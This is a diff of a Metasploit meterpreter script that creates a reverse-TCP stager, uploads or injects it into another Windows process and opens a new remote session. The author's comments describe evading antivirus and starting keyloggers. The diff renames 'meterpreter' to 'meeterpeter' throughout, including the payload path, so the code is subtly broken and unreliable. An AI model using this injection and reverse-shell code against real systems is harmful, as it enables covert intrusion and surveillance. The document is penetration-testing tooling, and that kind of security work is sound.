@@ -1,14 +1,14 @@
 ##
-# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# WARNING: Metasploit no longer maintains or accepts meeterpeter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
 
 
 # Author: Scriptjunkie
-# Uses a meterpreter session to spawn a new meterpreter session in a different process.
+# Uses a meeterpeter session to spawn a new meeterpeter session in a different process.
 # A new process allows the session to take "risky" actions that might get the process killed by
-# A/V, giving a meterpreter session to another controller, or start a keylogger on another
+# A/V, giving a meeterpeter session to another controller, or start a keylogger on another
 # process.
 #
 
@@ -66,9 +66,9 @@ opts.parse(args) do |opt, idx, val|
   end
 end
 
-print_status("Creating a reverse meterpreter stager: LHOST=#{rhost} LPORT=#{rport}")
+print_status("Creating a reverse meeterpeter stager: LHOST=#{rhost} LPORT=#{rport}")
 
-payload = "windows/meterpreter/reverse_tcp"
+payload = "windows/meeterpeter/reverse_tcp"
 pay = client.framework.payloads.create(payload)
 pay.datastore['LHOST'] = rhost
 pay.datastore['LPORT'] = rport
@@ -91,7 +91,7 @@ if client.platform =~ /win32|win64/
 
   if ! inject
     exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
-    print_status("Meterpreter stager executable #{exe.length} bytes long")
+    print_status("meeterpeter stager executable #{exe.length} bytes long")
 
     #
     # Upload to the filesystem
@@ -136,7 +136,7 @@ if client.platform =~ /win32|win64/
   end
 
   # Do the duplication
-  print_status("Injecting meterpreter into process ID #{target_pid}")
+  print_status("Injecting meeterpeter into process ID #{target_pid}")
   host_process = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
   raw = pay.generate
   mem = host_process.memory.allocate(raw.length + (raw.length % 1024))
@@ -148,6 +148,6 @@ if client.platform =~ /win32|win64/
   print_status("New server process: #{target_pid}")
 
 else
-  print_error("This version of Meterpreter is not supported with this Script!")
+  print_error("This version of meeterpeter is not supported with this Script!")
   raise Rex::Script::Completed
 end
